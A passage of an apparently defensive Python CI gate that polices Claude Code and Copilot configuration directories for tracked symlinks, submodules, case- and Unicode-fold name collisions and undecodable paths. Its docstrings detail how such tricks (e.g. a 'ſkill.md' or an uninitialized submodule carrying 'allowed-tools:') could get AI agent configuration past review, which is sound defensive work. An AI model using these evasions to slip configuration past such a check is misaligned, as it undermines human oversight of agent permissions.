    Every producer of a link/collision message returns one of these, so
    :func:`_dedupe_link_problems` can key on `(kind, path)` STRUCTURALLY instead of recovering
    the path from the rendered text with a regex — which a path containing a quote character
    defeats (`.claude/skills/a'b"c` printed one link as two annotations, PR-901 F-D / L-1).

    ``source`` records WHICH question produced it — ``"index"`` for git's answer about the
    index, ``"walk"`` for what an :func:`os.walk` saw on disk. Only a walk finding may be
    superseded by a fold-equivalent collision: an INDEX finding names a distinct index entry
    at its own byte-exact spelling, and dropping it left the operator to discover the link
    only after fixing the collision — two remediation rounds for one review (PR-901 RT-1).

    It is a `str` subclass on purpose: these messages travel through lists that are printed,
    searched with `in`, sorted and compared as ordinary strings everywhere else. The one place
    the distinction matters is de-duplication — and the fact that a message EMBEDDED in a
    larger one (the roster's "no persona wrappers found … because `.claude` is a tracked
    gitlink") becomes a plain `str` again is the wanted behavior, not a leak: that sentence is
    a different finding from the bare gitlink line and must not be dropped as its duplicate
    (PR-901 second round, RT-5).
    """

    def __new__(
        cls, message: str, path: str, kind: str = "link", source: str = "walk"
    ) -> "_LinkMessage":
        text = super().__new__(cls, message)
        text.path = path
        text.kind = kind
        text.source = source
        return text


def _symlink_problem(kind: str, path: str) -> str:
    """The one message every walk uses for a symlinked config path (CERT-F1).

    Both walks pass ``followlinks=False`` so a link LOOP cannot hang the gate — but Claude
    Code follows links, so a tracked symlinked directory under `.claude/{agents,commands,
    skills}` ships real configuration the gate would otherwise never open: the walk does not
    descend, the target's front matter is never policed, and the run reports PASS. Not
    following the link is right; staying SILENT about it is the defect. Reporting the link
    itself keeps the gate's coverage claim honest — every file it counted, it read.
    """
    return _LinkMessage(
        f"{kind} path {path!r} is a symlink; the gate does not follow links but Claude Code "
        f"does — replace it with real files or remove it",
        path,
    )


def _walk_symlink_problems(kind: str, dirpath: str, dirnames: "list[str]") -> "list[str]":
    """Symlink problems for the SUBDIRECTORIES of one :func:`os.walk` step (may be empty).

    ``os.walk(followlinks=False)`` still LISTS a symlinked directory in ``dirnames``; it
    simply does not recurse into it. That listing is the only place the link is visible, so
    it is where the problem is raised. Degrades gracefully where the platform cannot answer
    (``os.path.islink`` is total on every supported platform, but an OSError from a racing
    unlink must not take the gate down with a traceback).
    """
    problems: "list[str]" = []
    for name in dirnames:
        candidate = os.path.join(dirpath, name)
        try:
            linked = os.path.islink(candidate)
        except OSError:  # pragma: no cover - defensive: path raced away mid-walk
            continue
        if linked:
            problems.append(_symlink_problem(kind, candidate))
    return problems


# The two git index modes that make a tracked path something this gate cannot read but the
# CLI can: a SYMLINK (120000) and a GITLINK/submodule (160000). Both are recorded by git
# whatever the working tree currently holds, which is the whole point — see
# :func:`_tracked_link_problem`.
TRACKED_LINK_MODES = ("120000", "160000")

# The gitlink half of the pair, named because the COVERAGE rule needs to tell it apart from
# a symlink: an uninitialized submodule directory is populated on disk by something other
# than this index, which is a different question from "this path is a link" (PR-901 last
# round, F-2).
_GITLINK_MODE = "160000"


# The environment variables that make git answer about a DIFFERENT repository than the one
# the working directory names, or about a DIFFERENT SET OF PATHS than the ones asked for. An
# ambient `GIT_DIR` — a stale `export` in a shell, a CI wrapper, a hook — would silently
# redirect every query in this file at some other checkout, and a clean answer from the wrong
# repository reads exactly like a clean answer from this one (PR-901 F-E). The pathspec-magic
# family is the same defect one level down: `GIT_LITERAL_PATHSPECS=1` makes a `:(literal)…`
# pathspec match NOTHING, so the index query returned zero entries and the gate passed in
# silence (PR-901 second round, H-2). The index and link/fold query hands git no pathspec at
# all — it lists the index once and filters in Python; the only per-file question,
# `git ls-files --error-unmatch`, passes one absolute path after `--` with no magic prefix —
# and the variables stay scrubbed so neither that call nor a future pathspec can reopen the
# hole. `GIT_NAMESPACE` is scrubbed because a namespaced ref view is not the checkout the
# walks read.
#
# What is deliberately NOT scrubbed: `GIT_CEILING_DIRECTORIES` and
# `GIT_DISCOVERY_ACROSS_FILESYSTEM`, which only RESTRICT where git looks for a repository.
# Removing them can only WIDEN the answer — up into an ENCLOSING repository whose index knows
# nothing about the tree being walked, which is the false clean this gate must never print
# (PR-901 second round, RT-4). Left in place they can at worst make git say "not a git
# repository", which reaches the operator as SKIP/unverified. (Coverage is checked
# independently in :func:`_index_findings`, so an enclosing repo cannot clear a tree it does
# not cover even when discovery does widen.)
_SCRUBBED_GIT_ENV = (
    "GIT_DIR",
    "GIT_WORK_TREE",
    "GIT_INDEX_FILE",
    "GIT_COMMON_DIR",
    "GIT_OBJECT_DIRECTORY",
    "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    "GIT_NAMESPACE",
    "GIT_LITERAL_PATHSPECS",
    "GIT_GLOB_PATHSPECS",
    "GIT_NOGLOB_PATHSPECS",
    "GIT_ICASE_PATHSPECS",
)


def _git_env() -> "dict[str, str]":
    """``os.environ`` with the repository-redirecting ``GIT_*`` variables removed."""
    env = dict(os.environ)
    for name in _SCRUBBED_GIT_ENV:
        env.pop(name, None)
    return env


def _tracked_link_problem(mode: str, path: str) -> str:
    """The message for a path GIT records as a link (mode 120000) or a gitlink (160000).

    The path-based checks in this gate all ask the FILESYSTEM a question — ``os.path.exists``,
    an ``os.walk`` name match — and both shapes answer "nothing here" in a checkout-only CI
    job while resolving to real configuration elsewhere:

    * **symlink (120000)**: a link pointing at `bin/`, `obj/` or `artifacts/` is absent in CI
      and present on every developer machine after a `dotnet build`, so the tracked link
      sails through the gate and still resolves to configuration Claude Code reads.
    * **gitlink (160000)**: a submodule directory is checked out EMPTY by CI's plain
      `actions/checkout` (no `submodules: recursive`), so the walk counts zero files and the
      gate goes green — while `git submodule update --init` on a developer machine populates
      it with, say, a `SKILL.md` carrying `allowed-tools:` that the CLI then loads
      (LAST-CERT F1).

    Git records the mode either way, which is why TRACKING (not resolution) is the question
    this gate asks.
    """
    if mode == "160000":
        return _LinkMessage(
            f"{path!r} is a tracked gitlink/submodule (git mode 160000); CI checks it out "
            f"empty and the CLI loads whatever it contains once initialized — vendor the "
            f"files instead",
            path,
            source="index",
        )
    return _LinkMessage(
        f"{path!r} is a tracked symlink (git mode 120000); the gate cannot see through links "
        f"that may resolve elsewhere on another machine — replace it with real files",
        path,
        source="index",
    )


def _case_collision_problem(path: str, expected: str) -> str:
    """The message for an index path that FOLDS onto a policed one (PR-901 F-C, H-1, RT-2).

    Git's index is case-SENSITIVE and byte-exact, so `.Claude/hooks` is a different path from
    `.claude/hooks`. macOS (APFS) and Windows (NTFS) checkouts are not: they fold CASE, and
    APFS folds UNICODE NORMALIZATION forms too, so the same entry materializes inside the real
    `.claude/` directory, where Claude Code reads it as configuration. A gate that only ever
    asked about the exact spelling would therefore clear a file the CLI loads, on the two
    platforms most contributors use. The remedy is a rename, not a link replacement, so this
    is its own message and it is reported for ANY index mode — a plain file impersonates a
    config file just as effectively as a link does.
    """
    return _LinkMessage(
        f"{path!r} folds onto {expected!r} on a case-insensitive checkout (macOS/Windows): "
        f"git records it as a separate, byte-exact path, while the working tree merges it "
        f"into {expected!r} where Claude Code reads it — rename it",
        path,
        "case",
        "index",
    )


def _display_path(path: str) -> str:
    """`path` rendered so it can be PRINTED (surrogate escapes become U+FFFD, never raise).

    Index paths reach this file surrogate-escaped (:func:`_ls_files`), and writing a lone
    surrogate to stdout raises :exc:`UnicodeEncodeError` — which would turn a finding into a
    crash at the very moment the gate has something to say.
    """
    return path.encode("utf-8", "surrogateescape").decode("utf-8", "replace")


def _is_undecodable(path: str) -> bool:
    """True when `path` carries surrogate escapes, i.e. bytes that are not valid UTF-8."""
    return any("\udc80" <= char <= "\udcff" for char in path)


def _undecodable_problem(path: str) -> str:
    """The message for a tracked path under a policed tree whose bytes are not UTF-8.

    Reported rather than tolerated (PR-901 addendum 2). Such an entry is legal in the index
    and on ext4; what it is not is comparable — this gate, the CLI's own globs, and the
    reviewer reading the diff each see a different name for it, and on a checkout that folds
    names it may materialize as one the CLI loads. "Cannot be named reliably" is a finding,
    so it fails CLOSED instead of passing through as an ordinary file.
    """
    return _LinkMessage(
        f"{_display_path(path)!r} is tracked under a policed `.claude` tree but its bytes are "
        f"not valid UTF-8; no walk, glob or review can name it reliably and a folding "
        f"checkout may merge it into a name Claude Code loads — rename it to a UTF-8 spelling",
        path,
        "encoding",
        "index",
    )


def _fold(name: str) -> str:
    """The ONE key two spellings that name the SAME checked-out path share (PR-901 RT-2).

    `unicodedata.normalize("NFC", …)` then `str.casefold()`, applied to BOTH sides of every
    comparison in this file:

    * **casefold, not lower.** `str.lower()` is identity on `ſ` (U+017F LATIN SMALL LETTER
      LONG S) and on `K` (U+212A KELVIN SIGN); `casefold()` maps them to `s` and `k`. A
      tracked `.mcp.jſon` IS `.mcp.json` on APFS — and git's own `:(icase)` pathspec magic
      does not see it either, which is why the folding is done here rather than delegated.
    * **NFC first.** APFS is normalization-insensitive, so a decomposed `.claude/agents` (with
      a combining mark anywhere in the name) resolves to the composed spelling in the working
      tree while the index keeps the bytes it was given.
    """
    return unicodedata.normalize("NFC", name).casefold()


def _path_parts(path: str) -> "tuple[str, ...]":
    """`path` split into its non-empty components (`/` and `os.sep` both accepted)."""
    return tuple(part for part in path.replace(os.sep, "/").split("/") if part and part != ".")


def _fold_parts(path: str) -> "tuple[str, ...]":
    """:func:`_path_parts` with every component :func:`_fold`ed."""
    return tuple(_fold(part) for part in _path_parts(path))


def _folds_under(parts: "tuple[str, ...]", prefix: "tuple[str, ...]") -> bool:
    """True when `parts` IS `prefix` or lies under it, comparing folded SEGMENTS.

    Segment-wise, never a byte prefix: `.claudex/z` and `.claudeß` (whose casefold is
    `.claudess`) must NOT match `.claude`, while `.claude/ſkills/x` must.
    """
    if len(parts) < len(prefix):
        return False
    return all(_fold(part) == _fold(want) for part, want in zip(parts, prefix))


def _index_finding_problem(kind: str, detail: str, path: str) -> str:
    """Render one :func:`_index_findings` tuple as the message an operator reads."""
    if kind == "case":
        return _case_collision_problem(path, detail)
    if kind == "encoding":
        return _undecodable_problem(path)
    return _tracked_link_problem(detail, path)


def _is_within(path: str, root: str) -> bool:
    """True when the LEXICAL `path` is `root` itself or lies under it (no symlink resolution)."""
    if path == root:
        return True
    return path.startswith(root.rstrip(os.sep) + os.sep)


def _query_anchor(absolute: "list[str]") -> str:
    """The directory git is asked FROM: the parent of the shallowest queried path.

    Never a queried path itself, and never anything below one — which is the whole point
    (PR-901 F-A). The old code ran git from `dirname(first pathspec)`, i.e. from INSIDE
    `.claude` whenever a check's first path was `.claude/agents`. When `.claude` is a
    populated SUBMODULE that lands in the nested repository, whose index holds no gitlink, so
    the check reports "no links" about a repository it was never asked about; when `.claude`
    is a SYMLINK out of the tree it lands outside any checkout, so the check SKIPs with "not a
    git checkout" — a false "environment problem" for what is really tracked configuration.
    Anchoring above the `.claude` root makes both shapes ordinary index entries.
    """
    base = min(absolute, key=lambda path: (path.count(os.sep), path))
    return os.path.dirname(base) or os.curdir


# Cache of `git ls-files` answers, keyed by the work-tree root, so the several checks that
# each ask about `.claude` spend ONE subprocess per repository per run (PR-901 SRE L-2). A
# ``None`` (git could not answer) is cached like any other answer: the failure is a property
# of the repository/index, not of which caller asked, and re-asking would only turn one
# honest "unverified" into a flaky mix of verdicts within a single report.
_LS_FILES_CACHE: "dict[str, list[tuple[str, str]] | None]" = {}

# The cache is correct for a RUN of this gate — a one-shot process that never writes to an
# index — and wrong for the SELF-TEST, which builds fixture repositories and stages files into
# them BETWEEN queries in one process. The self-test therefore turns it off and exercises the
# caching path in one dedicated assertion instead of silently reading stale listings
# everywhere (PR-901 SRE L-2).
_LS_FILES_CACHE_ENABLED = True


def _ls_files(top: str) -> "list[tuple[str, str]] | None":
    """Every index entry as `(mode, repo-relative path)` for `top`, or ``None`` if git failed.

    The listing carries NO PATHSPEC on purpose (PR-901 second round, H-2). The previous
    version handed git `:(literal)…` and `:(icase,literal)…` magic, which an ambient
    `GIT_LITERAL_PATHSPECS=1` turns into a request for a file literally named
    `:(literal).claude` — matching nothing, so the query returned zero entries and every
    caller read that as "no findings" and PASSED. Filtering in Python instead means the
    selection rules are this file's own (and are unit-tested), no user-controlled string is
    ever interpreted as a pattern, and the case/normalization folding the checkouts actually
    perform can be applied — which no git pathspec can do (`:(icase)` does not fold `ſ`).

    ``-z`` so no path is ever quoted or escaped, ``--full-name`` so one entry has exactly one
    spelling whatever directory git was invoked from. ``None`` is "git could not answer" — a
    timeout, a non-zero exit, an unreadable index — and is never collapsed into "no entries".

    The output is captured as BYTES and decoded with ``errors="surrogateescape"`` (PR-901
    addendum 2). A path git holds is a byte string, not text: a file staged as
    `.claude/skills/x/\xffkill.md` is perfectly legal in the index and on ext4, and letting
    :mod:`subprocess` decode it strictly raised :exc:`UnicodeDecodeError` out of this
    function — an unhandled traceback the runner reports as "the gate crashed" (exit 2)
    rather than as the finding it is. Surrogate-escaped, the entry survives to be REPORTED
    (:func:`_undecodable_problem`), which is the fail-closed answer.
    """
    if _LS_FILES_CACHE_ENABLED and top in _LS_FILES_CACHE:
        return _LS_FILES_CACHE[top]
    _LS_FILES_CACHE[top] = None  # fail-closed until the listing actually succeeds
    try:
        proc = subprocess.run(
            ["git", "ls-files", "-s", "-z", "--full-name", "--"],
            cwd=top,
            capture_output=True,
            timeout=30,
            env=_git_env(),
        )
    except (OSError, subprocess.TimeoutExpired):  # pragma: no cover - environment dependent
        return None
    if proc.returncode != 0:
        # 128 = not a git repository / an unreadable index; anything else is equally
        # unanswerable. Never "clean".
        return None
    entries: "list[tuple[str, str]]" = []
    for entry in proc.stdout.decode("utf-8", "surrogateescape").split("\0"):
        if not entry:
            continue
        meta, tab, name = entry.partition("\t")
        if not tab or not name:  # pragma: no cover - defensive: unexpected ls-files output
            continue
        entries.append((meta.split(" ", 1)[0], name))
    _LS_FILES_CACHE[top] = entries
    return entries


# The names Claude Code resolves THROUGH THE FILESYSTEM inside a `.claude` directory. They are
# policed by every check, whichever subtree that check owns: `.claude/COMMANDS/evil.md` is
# configuration the CLI loads on a macOS clone, and it must be named whether the reader is
# looking at the roster check's report or the startup one's.
# The one policed child a SKILL.md manifest means anything under; the manifest-leaf rule in
# :func:`_index_findings` is scoped to it, so `.claude/commands/skills/skill.md` — an
# ordinary slash-command file in a directory that happens to be called `skills` — is not
# reported as folding onto a manifest name it is not one of (PR-901 last round, Info).
SKILLS_CHILD_NAME = "skills"

POLICED_CLAUDE_CHILDREN = (
    "agents",
    "commands",
    SKILLS_CHILD_NAME,
    "settings.json",
    "settings.local.json",
)

# The ONE byte-exact spelling a skill manifest may carry. Claude Code resolves the manifest
# BY NAME inside each skill directory, and on a case-insensitive checkout every spelling that
# folds onto it (`skill.md`, `Skill.MD`, `ſkill.md`) resolves to the same file — so the gate
# scans them all (:func:`scan_command_skill_frontmatter`) and requires the canonical spelling
# in the index (:func:`_index_findings`), because two of them cannot coexist there.
SKILL_MANIFEST_NAME = "SKILL.md"

# The suffix that makes a file in `.claude/agents` or `.claude/commands` configuration.
MARKDOWN_SUFFIX = ".md"

# The suffix that makes a file in `.github/agents` a Copilot persona wrapper. It is the
# GENERATED mirror of `.claude/agents/<name>.md` (see `tools/aiconfig/generate-copilot.py`),
# so the gate polices it exactly as it polices the canonical tree — a wrapper is loaded and
# run by whichever runtime reads it, and Copilot reads this one.
COPILOT_AGENT_SUFFIX = ".agent.md"

# The second startup-config root. The `.github` directory is NOT policed wholesale the way
# `.claude` is: it also holds `workflows/`, `CODEOWNERS`, `ISSUE_TEMPLATE/` and
# `dependabot.yml`, none of which are AI configuration and all of which have their own
# review path. Policing them here would red every dependabot PR on an unrelated rule. Only
# the three AI-config children below — plus the `.github` root ENTRY itself, so a tracked
# symlink or submodule AT `.github` cannot hide the whole tree — are in scope.
POLICED_GITHUB_CHILDREN = (
    "agents",
    SKILLS_CHILD_NAME,
    "copilot-instructions.md",
)

# Which children each config root contributes to the case-fold question, keyed on the FOLDED
# root name so `sub/.Claude/agents` expands its children too (the raw `==` this replaced did
# not — see :func:`_policed_prefixes`). A root absent from this table contributes only its own
# spelling, never a child set borrowed from another root: `.github/settings.local.json` is not
# a Claude permission file, and `.claude/workflows` is not a GitHub Actions directory.
POLICED_CHILDREN_BY_ROOT = {
    _fold(CLAUDE_DIR_NAME): POLICED_CLAUDE_CHILDREN,
    _fold(GITHUB_DIR_NAME): POLICED_GITHUB_CHILDREN,
}

# Roots whose bare spelling polices the ROOT ENTRY ONLY, never everything beneath it.
#
# `.claude` is AI configuration all the way down, so its root prefix deliberately subsumes
# every subtree — that is how a tracked link at `.claude/hooks`, a path no check names
# explicitly, is still caught (LAST-CERT F2). `.github` is not: the same breadth would make a
# tracked symlink at `.github/workflows/ci.yml` or `.github/ISSUE_TEMPLATE/bug.yml` a finding
# of THIS gate, which reds unrelated PRs on a rule that was never about them and belongs to
# the workflow review path instead. So the `.github` root entry itself is policed — a symlink
# or submodule AT `.github` would otherwise hide the whole AI tree behind it — while depth
# comes only from the three names in :data:`POLICED_GITHUB_CHILDREN`.
SHALLOW_CONFIG_ROOTS = frozenset({_fold(GITHUB_DIR_NAME)})


def _prefix_matches(parts: "tuple[str, ...]", prefix: "tuple[str, ...]") -> bool:
    """Does `parts` fall under `prefix`, honoring :data:`SHALLOW_CONFIG_ROOTS`?

    A shallow root matches only ITSELF; every other prefix matches itself and everything
    below it, exactly as :func:`_folds_under` always has.
    """
    if len(prefix) == 1 and _fold(prefix[0]) in SHALLOW_CONFIG_ROOTS:
        return tuple(_fold(part) for part in parts) == tuple(_fold(part) for part in prefix)
    return _folds_under(parts, prefix)


def _is_markdown_name(filename: str) -> bool:
    """Does `filename` name a markdown file on the checkout the CLI reads? (folded suffix)"""
    return _fold(filename).endswith(_fold(MARKDOWN_SUFFIX))


def _is_skill_manifest_name(filename: str) -> bool:
    """Does `filename` name the skill MANIFEST on the checkout the CLI reads? (folded)

    Folded, never lowered: `str.lower()` leaves `ſ` (U+017F) alone, so a manifest committed as
    `ſkill.md` was not scanned at all while APFS resolved `SKILL.md` straight to it and Claude
    Code loaded its `allowed-tools:` (PR-901 F-1). NFC and not NFKC, because `SKİLL.md` and a
    fullwidth `ｍd` are DIFFERENT files to the checkout and to the CLI's own name match — a
    gate that policed them would be policing files nothing loads.
    """
    return _fold(filename) == _fold(SKILL_MANIFEST_NAME)


def _is_copilot_agent_name(filename: str) -> bool:
    """Does `filename` name a Copilot persona wrapper on the checkout Copilot reads? (folded)

    Folded for the same reason :func:`_is_skill_manifest_name` is: `x.AGENT.MD` and a `ſ`
    spelling are the same file to APFS/NTFS and to the loader, so a wrapper committed under a
    variant spelling is loaded while a byte-exact scan never sees it. The STEM is free (it is
    the persona slug); only the suffix has a canonical spelling.
    """
    folded = _fold(filename)
    suffix = _fold(COPILOT_AGENT_SUFFIX)
    return folded.endswith(suffix) and len(folded) > len(suffix)


def _canonical_copilot_agent_name(filename: str) -> str:
    """`filename` with its `.agent.md` suffix in the canonical spelling (stem untouched)."""
    return filename[: len(filename) - len(COPILOT_AGENT_SUFFIX)] + COPILOT_AGENT_SUFFIX

# A sparse index collapses a whole directory into ONE entry (mode 040000, a trailing slash).
# The files inside it are then absent from the listing, so "no findings under `.claude`" would
# be an artefact of the index format rather than a fact about the tree.
_SPARSE_DIR_MODE = "040000"


def _policed_prefixes(specs: "list[str]") -> "list[tuple[str, ...]]":
    """The canonical spellings an index entry is compared against, longest first.

    Each queried path contributes its own spelling, and a CONFIG ROOT additionally contributes
    every name its entry in :data:`POLICED_CHILDREN_BY_ROOT` lists — that is what extends the
    case-fold question BELOW the root's direct children, where it used to stop (PR-901 second
    round, H-1: `.claude/COMMANDS/evil.md` and `.claude/Settings.local.json` passed the whole
    gate). Longest first so the most specific canonical spelling is the one quoted in the
    remedy (`.claude/skills`, not `.claude`).

    The root is matched FOLDED, and each root contributes only its OWN children: `.github`
    brings `agents`, `skills` and `copilot-instructions.md` and deliberately NOT `workflows`
    or `settings.local.json`, so restoring the Copilot mirror does not quietly place every
    GitHub Actions file under this gate. Folding the root name also fixes a latent gap in the
    raw `==` this replaced: `--agents-dir sub/.Claude/agents` named a root the checkout
    resolves but never expanded its children.

    The prefixes are ANCHOR-RELATIVE-turned-repo-relative spellings (`sub/.claude`), never a
    bare component: a clean root `.claude` must not mask a `sub/.Claude` under an
    `--agents-dir sub/.claude/agents`.
    """
    prefixes: "list[tuple[str, ...]]" = []
    for spec in specs:
        parts = _path_parts(spec)
        if not parts:
            continue
        if parts not in prefixes:
            prefixes.append(parts)
        children = POLICED_CHILDREN_BY_ROOT.get(_fold(parts[-1]))
        if children:
            for child in children:
                candidate = parts + (child,)
                if candidate not in prefixes:
                    prefixes.append(candidate)
    prefixes.sort(key=len, reverse=True)
    return prefixes


def _has_disk_entries(path: str) -> bool:
    """True when `path` is a real directory that CONTAINS something (never follows a link)."""
    if not os.path.isdir(path) or os.path.islink(path):
        return False
    try:
        with os.scandir(path) as scan:
            return any(True for _entry in scan)
    except OSError:  # pragma: no cover - defensive: unreadable directory
        return False


def _count_uncovered_disk_files(
    path: str,
    prefix: "tuple[str, ...]",
    listed: "list[tuple[str, str, tuple[str, ...]]]",
) -> int:
    """How many files under `path` NO index entry folds onto (links counted, never followed).

    The number the `git add` note quotes, and it has to be the number of files the note is
    ABOUT. Counting every file under the queried root instead reported all 46 files of a
    `.claude` whose only uncovered child was `skills/` — an operator reading it would go
    looking for 46 untracked paths, find one, and be left unsure which report was wrong
    (PR-901 last round, SEC L-1). An entry AT or ABOVE a file is git's answer about it, so
    only files with no such entry are counted.
    """
    total = 0
    for dirpath, _dirnames, filenames in os.walk(path, followlinks=False):
        relative = os.path.relpath(dirpath, path)
        base = prefix if relative == os.curdir else prefix + _path_parts(
            relative.replace(os.sep, "/")
        )
        for filename in filenames:
            parts = base + (filename,)
            if not any(_folds_under(parts, entry) for _mode, _name, entry in listed):
                total += 1
    return total


def _policed_root_parts(
    parts: "tuple[str, ...]",
) -> "tuple[tuple[str, ...], tuple[str, ...]] | None":
    """The config root `parts` lives in and ITS policed children, or ``None``.

    Scans right-to-left so the NEAREST root wins, and matches folded, so the root a
    case-insensitive checkout resolves is the one answered about. Returns the children tuple
    alongside the root because every caller needs both and must not borrow another root's set
    — `.github` owns `agents`/`skills`/`copilot-instructions.md`, `.claude` owns its five.
    """
    for index in range(len(parts) - 1, -1, -1):
        children = POLICED_CHILDREN_BY_ROOT.get(_fold(parts[index]))
        if children is not None:
            return parts[: index + 1], children
    return None


def _claude_root_parts(parts: "tuple[str, ...]") -> "tuple[str, ...] | None":
    """The config root `parts` lives in (folded match on the segment), or ``None``.

    Name kept for the fixtures and assertions written against it; it now answers for any root
    in :data:`POLICED_CHILDREN_BY_ROOT`, not only `.claude`.
    """
    matched = _policed_root_parts(parts)
    return None if matched is None else matched[0]


def _root_owned_by_index(
    parts: "tuple[str, ...]", listed: "list[tuple[str, str, tuple[str, ...]]]"
) -> bool:
    """Does the index actually OWN the config root that `parts` lives in? (PR-901 SRE L-1)

    The question that decides whether "this subtree has files on disk and no index entry"
    means *untracked work in the checkout the operator is standing in* or *a foreign tree the
    checkout knows nothing about*. It is answered only by an entry AT or UNDER one of THAT
    ROOT's policed children (`.claude`: `agents`, `commands`, `skills`, `settings.json`,
    `settings.local.json`; `.github`: `agents`, `skills`, `copilot-instructions.md`) — never
    by "some entry exists under the root".

    Taking the children from the matched root matters for `.github`, where a checkout that
    tracks only `workflows/` and `CODEOWNERS` does NOT thereby own the AI-config tree: a
    `.github/agents` exported into it stays UNVERIFIED rather than being cleared by unrelated
    entries that happen to share the root.

    That distinction is the whole safety of the rule. An export dropped inside an enclosing
    checkout that happens to track ONE innocuous `export/.claude/keep` would satisfy a
    laxer test and be CLEARED, which is exactly the false clean the coverage rule exists to
    prevent (PR-901 second round, RT-4). `keep` is not a policed child, so the root is not
    owned and the tree stays UNVERIFIED.
    """
    matched = _policed_root_parts(parts)
    if matched is None:
        return False
    root, children = matched
    return any(
        _folds_under(entry, root + (child,))
        for child in children
        for _mode, _name, entry in listed
    )


def _index_findings(
    paths: "list[str]",
) -> "tuple[list[tuple[str, str, str]] | None, str, list[str]]":
    """`([(kind, detail, path)], why, notes)` for what git's INDEX says about `paths`.

    ``why`` is empty when the index covered every queried path, and otherwise says what it
    did NOT cover. It is returned ALONGSIDE the findings, never instead of them: git having
    already named a tracked link is a fact about the tree whatever else was left unexamined,
    and discarding it turned a FAIL naming `.claude/hooks` into a green SKIP (PR-901 last
    round, F-1). ``(None, why, notes)`` is reserved for the answers that are not merely
    incomplete but unusable — no git, no checkout, a sparse index — where there is nothing
    to report alongside.

    Three kinds of finding, all invisible to every filesystem question this gate asks:

    * ``("link", mode, path)`` — a tracked SYMLINK (120000) or GITLINK/submodule (160000).
      See :func:`_tracked_link_problem`.
    * ``("case", expected, path)`` — an entry that FOLDS onto a policed path (case, or Unicode
      normalization form) without being spelled the way it is. See
      :func:`_case_collision_problem`. Reported for ANY index mode; when an entry is both, the
      collision wins, because the remedy is the rename and one path must not print twice.
      A skill MANIFEST is held to this rule by its leaf name too: `.claude/skills/x/ſkill.md`
      folds onto `SKILL.md` on the checkout the CLI reads, so the index may hold exactly the
      canonical spelling (:data:`SKILL_MANIFEST_NAME`, PR-901 F-1).
    * ``("encoding", "", path)`` — an entry whose bytes are not valid UTF-8. See
      :func:`_undecodable_problem`.

    Git is asked from the ANCHOR (:func:`_query_anchor`) — the directory that CONTAINS the
    `.claude` root, never `.claude` itself and never anything inside it. `git rev-parse
    --show-toplevel` is resolved once from there, the index is listed ONCE from that root with
    no pathspec, and the selection is done here by folded path segments. Every queried path is
    required to lie inside that work tree; a path that does not is reported as UNVERIFIED with
    that reason, because an index that does not cover a path cannot clear it. Containment is
    decided LEXICALLY (the queried paths are relocated into the anchor's resolved spelling, so
    macOS's `/var` -> `/private/var` does not read as "outside"): resolving the leaf would
    follow the very link under investigation, and a `.claude` symlink pointing out of the
    tree would then excuse itself from the query it exists to fail.

    Four ways the answer is UNVERIFIED rather than empty, all of them "git's answer does not
    cover what the walks read": git could not be asked at all; a queried DIRECTORY that holds
    files on disk lies in a `.claude` root this index does not OWN (an export dropped inside
    an ENCLOSING checkout — PR-901 second round, RT-4); the queried path lies under an
    UNINITIALIZED SUBMODULE, i.e. a gitlink ABOVE the `.claude` root, so the files on disk
    came from something other than this index (PR-901 last round, F-2); or the index is
    sparse and collapsed the policed tree into a directory entry. Neither ``None`` nor a
    coverage reason is ever collapsed into "no findings": callers report them as UNVERIFIED —
    the same contract :func:`_git_tracked` keeps — so an environment the gate could not
    interrogate never reads as an environment it cleared, and the two middle cases still
    carry whatever git DID name.

    A queried subtree with no index entry under it whose ROOT the index DOES own
    (:func:`_root_owned_by_index`) is ordinary untracked work — a developer's WIP
    `.claude/commands/foo.md` in the very checkout they are running the gate from. That is
    reported as a NOTE and the walk polices the files normally; skipping the check there
    told the operator to "run inside the checkout that tracks these files" while they were
    standing in it (PR-901 SRE L-1). It is safe because the index holding NOTHING under the
    path is also the guarantee that no TRACKED link is hiding there — the coverage rule
    exists to catch an index answering about the wrong tree, not an empty one.
    """
    if shutil.which("git") is None:
        return None, "git is not on PATH", []
    absolute = [os.path.abspath(path) for path in paths if path]
    if not absolute:
        return [], "", []
    anchor = _query_anchor(absolute)
    if not os.path.isdir(anchor):
        return None, f"the directory {anchor!r} they would be looked up from does not exist", []
    anchor_abs = os.path.abspath(anchor)
    # The anchor is a real directory, so resolving IT is safe and is what makes the
    # comparison with git's (resolved) answer meaningful. The queried paths are then
    # relocated into it lexically, leaf untouched.
    anchor_real = os.path.realpath(anchor_abs)
    top = _git_toplevel(anchor_real)
    if top is None:
        return None, f"{anchor!r} is not inside a git checkout", []
    top_real = os.path.realpath(top)
    if not _is_within(anchor_real, top_real):  # pragma: no cover - defensive
        return None, (
            "the directory git was asked from lies outside the work tree it answered"
        ), []
    specs: "list[str]" = []
    on_disk: "dict[str, str]" = {}
    for candidate in absolute:
        relocated = os.path.normpath(
            os.path.join(anchor_real, os.path.relpath(candidate, anchor_abs))
        )
        if not _is_within(relocated, top_real):
            return None, (
                f"path {candidate!r} lies outside the work tree git answered from "
                f"({top_real!r})"
            ), []
        relative = os.path.relpath(relocated, top_real).replace(os.sep, "/")
        if relative not in specs:
            specs.append(relative)
            on_disk[relative] = candidate
    entries = _ls_files(top_real)
    if entries is None:
        return None, f"git ls-files could not read the index in {top_real!r}", []
    scope = [_path_parts(spec) for spec in specs]
    prefixes = _policed_prefixes(specs)
    listed = [(mode, name, _path_parts(name)) for mode, name in entries]
    # COVERAGE: a clean answer about a tree the index does not hold is not a clean tree. It
    # is collected here and reported ALONGSIDE the findings below, never instead of them
    # (PR-901 last round, F-1).
    notes: "list[str]" = []
    unverified: "list[str]" = []
    for spec in specs:
        prefix = _path_parts(spec)
        if not prefix or not _has_disk_entries(on_disk[spec]):
            continue
        # An entry AT or ABOVE the queried path is git's whole answer about everything
        # "inside" it — a gitlink or symlink at `.claude` covers the populated
        # submodule/resolved-link work tree on disk, which must not read as a tree the index
        # forgot — with ONE exception, below.
        above = [
            (mode, parts) for mode, _name, parts in listed if _folds_under(prefix, parts)
        ]
        # The exception: a GITLINK that lies ABOVE the `.claude` root is not an answer about
        # this tree at all, it is the index saying "that subtree belongs to another
        # repository I have not initialized". A `vendor` gitlink in an enclosing checkout,
        # with `vendor/deltasharp` populated by hand from an export, made every local check
        # PASS unqualified and called an untracked `.mcp.json` "not policed" — the enclosing
        # index has no entries under it at all, so there was nothing to find (PR-901 last
        # round, F-2). An entry at or under the `.claude` root chain still IS git's whole
        # answer, and the findings loop names it.
        if any(
            mode == _GITLINK_MODE and _claude_root_parts(parts) is None
            for mode, parts in above
        ):
            unverified.append(
                f"{spec!r} lies inside a submodule directory this checkout has not "
